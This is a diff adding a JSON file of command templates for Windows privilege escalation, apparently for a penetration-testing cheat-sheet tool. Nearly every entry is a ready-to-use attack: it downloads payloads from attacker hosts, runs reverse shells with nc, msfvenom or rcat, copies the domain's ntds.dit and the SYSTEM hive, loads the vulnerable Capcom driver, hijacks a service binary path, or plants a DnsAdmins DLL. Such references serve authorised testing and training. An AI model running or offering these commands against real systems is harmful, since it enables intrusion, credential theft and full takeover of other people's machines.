@@ -1,0 +1,57 @@
+{
+  "commands": [
+    {
+      "title": "PrivescCheck.ps1",
+      "template": "git clone https://github.com/itm4n/PrivescCheck.git\ncd PriveseChecl\npowershell -ep bypass -c \". .\\PrivescCheck.ps1; Invoke-PrivescCheck\"",
+      "description": "Runs PrivescCheck PowerShell script to enumerate Windows privilege escalation opportunities."
+    },
+    {
+      "title": "WinPEAS",
+      "template": "powershell -Command \"Invoke-WebRequest -Uri 'https://github.com/carlospolop/PEASS-ng/releases/latest/download/WinPEASx64.exe' -OutFile 'C:\\Users\\Public\\WinPEASx64.exe'\"",
+      "description": "Downloads WinPEAS executable for automated Windows privilege escalation enumeration."
+    },
+    {
+    "title": "SeDebugPrivilege / ProcessInjection + adopt.exe",
+    "template": "# Download Process injection from:https://github.com/3xpl01tc0d3r/ProcessInjection\n# Download adopt from:https://github.com/xct/adopt\n\ndotnet inline-execute /home/user/ProcessInjection.exe /f:raw /pid:3488 /t:1 /path:C:\\Windows\\Tasks\\adopt.exe\n# SeDebugPrivilege: Migrate PID to a privileged process (e.g., WinLogon) to execute adopt.exe\n# WinLogon PID: 3488\n",
+    "description": "Uses SeDebugPrivilege to inject adopt.exe into a privileged process (WinLogon) using ProcessInjection, allowing privilege escalation to SYSTEM."
+    },
+    {
+      "title": "SeImpersonatePrivilege / GodPotato",
+      "template": "https://github.com/BeichenDream/GodPotato\n# Download: iwr http://<tun0>/GodPotato-NET4.exe -outfile gp.exe\n# Execute: .\\gp.exe -cmd \"C:\\Users\\Public\\nc64.exe -e cmd.exe <tun0> <port>\"\n\n# Listen for reverse shell\nrlwrap nc -nlvp <port>",
+      "description": "Exploits SeImpersonatePrivilege using GodPotato to get a reverse shell as SYSTEM."
+    } ,
+       {
+      "title": "SeBackupPrivilege / DiskShadow",
+      "template": "set verbose on\nset metadata C:\\Windows\\Temp\\meta.cab\nset context clientaccessible\nset context persistent\nbegin backup\nadd volume C: alias cdrive\ncreate\nexpose %cdrive% E:\nend backup\n\n# Save this as back_script.txt and run:\ndiskshadow /s back_script.txt\n\n# Copy sensitive files\ncd E:\nrobocopy /b E:\\Windows\\ntds . ntds.dit\nreg save hklm\\system C:\\temp\\system.bak",
+      "description": "Uses SeBackupPrivilege to dump Windows registry hives and extract sensitive credentials for privilege escalation."
+    },
+{
+  "title": "SeTcbPrivilege / TcbElevation + RCAT",
+  "template": "#Download TcbElevation.cpp from: https://gist.github.com/antonioCoco/19563adef860614b56d010d92e67d178\n\niwr http://<tun0>/TcbElevation.exe -outfile C:\\Users\\svc_deploy\\Documents\\TcbElevation.exe\n\n# Download RCAT from GitHub: https://github.com/xct/rcat\n\nupload rcat_10.8.0.210_443.exe\n.\\TcbElevation.exe pwn \"C:\\Windows\\system32\\cmd.exe /c C:\\Users\\username\\Documents\\rcat_10.8.0.210_443.exe\"\n\n# Listen for reverse shell\nrlwrap nc -nlvp 443",
+  "description": "Uses SeTcbPrivilege to execute TcbElevation.exe to spawn a reverse shell with RCAT as SYSTEM."
+},
+
+  {
+  "title": "SeLoadDriverPrivilege / ExploitCapcom",
+  "template": "# Download necessary file from: https://github.com/k4sth4/SeLoadDriverPrivilege \n\nmsfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o shell.exe\n# Upload driver and executables\nupload Capcom.sys\nupload ExploitCapcom.exe\nupload eoploaddriver_x64.exe\nupload shell.exe\n\n# Load vulnerable driver\neoploaddriver_x64.exe System\\CurrentControlSet\\dfserv C:\\temp\\Capcom.sys\n\n# Exploit driver to spawn SYSTEM shell\nExploitCapcom.exe LOAD C:\\temp\\Capcom.sys\nExploitCapcom.exe EXPLOIT C:\\temp\\shell.exe",
+  "description": "Exploits SeLoadDriverPrivilege by uploading and loading a vulnerable driver (Capcom.sys) to execute a reverse shell as SYSTEM."
+},{
+  "title": "Server Operator / Service Binary Path Exploit",
+  "template": "net user <username>  # Verify if user is member of Server Operator group\n# List services and identify one with privileges\nGet-Service | Where-Object { $_.StartType -eq 'Automatic' } | Format-Table Name, DisplayName, Status\n\n# Upload reverse shell to target machine (example: nc.exe)\n# Modify service binary path to point to payload\nsc.exe config VMTools binPath= \"C:\\Users\\aarti\\Documents\\nc.exe -e cmd.exe 192.168.1.205 1234\"\n\n# Restart service to execute reverse shell\nsc.exe stop VMTools\nsc.exe start VMTools\n\n# On attacking machine, listen for reverse shell\nnc -lvp 1234",
+  "description": "Uses Server Operator group privileges to modify a Windows service binary path and execute a reverse shell as SYSTEM."
+}
+,{
+  "title": "DnsAdmins / dnscmd DLL Exploit",
+  "template": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f dll > shell.dll\n# Upload the payload to target machine\nupload shell.dll\n\n# Configure DNS server to load our DLL\ncmd /c 'dnscmd <DC> /config /serverlevelplugindll C:\\temp\\shell.dll'\n\n# Restart DNS service on domain controller\nsc.exe \\\\<DC> stop dns\nsc.exe \\\\<DC> start dns\n\n# On attacking machine, listen for reverse shell\nrlwrap nc -nlvp 9001",
+  "description": "Uses DnsAdmins group privileges to load a malicious DLL into the DNS server via dnscmd, resulting in a reverse shell as SYSTEM."
+}
+  ]
+}
+
+
+
+
+
+
+
+
